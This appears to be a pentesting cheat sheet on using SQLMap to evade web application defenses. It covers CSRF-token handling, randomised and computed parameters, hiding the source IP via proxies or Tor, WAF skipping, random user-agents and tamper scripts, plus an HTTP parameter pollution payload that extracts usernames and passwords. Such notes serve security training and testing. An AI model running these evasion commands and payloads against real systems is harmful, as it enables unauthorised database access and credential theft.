### Bypassing Web Application Protections with SQLMap

In real-world scenarios, automated tools like SQLMap often face protection mechanisms. SQLMap includes various options to bypass these defenses effectively.
### Anti-CSRF Token Bypass

Use the `--csrf-token` option to let SQLMap automatically detect and update the anti-CSRF token value in requests:

```bash
sqlmap -u "http://example.com" --data="id=1&csrf-token=XYZ" --csrf-token="csrf-token"
```

If a parameter name includes terms like `csrf`, `token`, or `xsrf`, SQLMap prompts you to update it dynamically.
### Unique Value Bypass

Some apps require unique values per request. Use `--randomize=<parameter>` to inject a randomized value in each request:

```bash
sqlmap -u "http://example.com/?id=1&rp=12345" --randomize=rp
```
### Calculated Parameter Bypass

When parameter values are derived from others (e.g., MD5 hashes), use `--eval`:

```bash
sqlmap -u "http://example.com/?id=1&h=<hash>" \
  --eval="import hashlib; h=hashlib.md5(id).hexdigest()"
```
### IP Address Concealing

To avoid detection:

- Use a proxy: `--proxy="socks4://127.0.0.1:9050"`
- Use a list: `--proxy-file=proxies.txt`
- Use Tor: `--tor`
- Check Tor: `--check-tor`
### WAF Detection and Bypass

SQLMap tries to detect WAFs using fake parameter probes.

- Use `--skip-waf` to skip this step.
### User-Agent Blacklisting

To avoid being blocked due to the default SQLMap user-agent:

```bash
sqlmap -u "http://example.com/?id=1" --random-agent
```
### Tamper Scripts

Modify payloads to bypass protections. Chain multiple scripts:

```bash
sqlmap -u "http://example.com/?id=1" --tamper=between,randomcase
```

**Common Tamper Scripts:**

|Script|Description|
|---|---|
|`0eunion`|Replaces UNION with e0UNION|
|`base64encode`|Encodes payload with base64|
|`between`|Replaces `>` with `NOT BETWEEN 0 AND #`|
|`commalesslimit`|Uses `LIMIT N OFFSET M`|
|`equaltolike`|Replaces `=` with `LIKE`|
|`halfversionedmorekeywords`|Adds versioned comment before each keyword|
|`modsecurityversioned`|Wraps query with MySQL versioned comment|
|`percentage`|Adds `%` before every character|
|`plus2concat`|Replaces `+` with `CONCAT()`|
|`randomcase`|Random casing of SQL keywords|
|`space2comment`|Replaces spaces with `/**/`|
|`space2dash`|Replaces spaces with `--random\n`|
|`space2hash`|Replaces spaces with `#random\n`|
|`space2plus`|Replaces spaces with `+`|
|`symboliclogical`|Uses `&&` and `|

List all tamper scripts:

```bash
sqlmap --list-tampers
```
### Miscellaneous Bypasses

**Chunked Transfer Encoding:**

- Use `--chunked` to break POST body into chunks, avoiding filters.    

**HTTP Parameter Pollution (HPP):**

- Payload split across multiple same-name parameters:

```text
?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users
```

This works if the backend supports concatenation (e.g., ASP).
# Tags
> #Exploitation #Service-Exploitation #MySQL #SQLmap #SQL-injection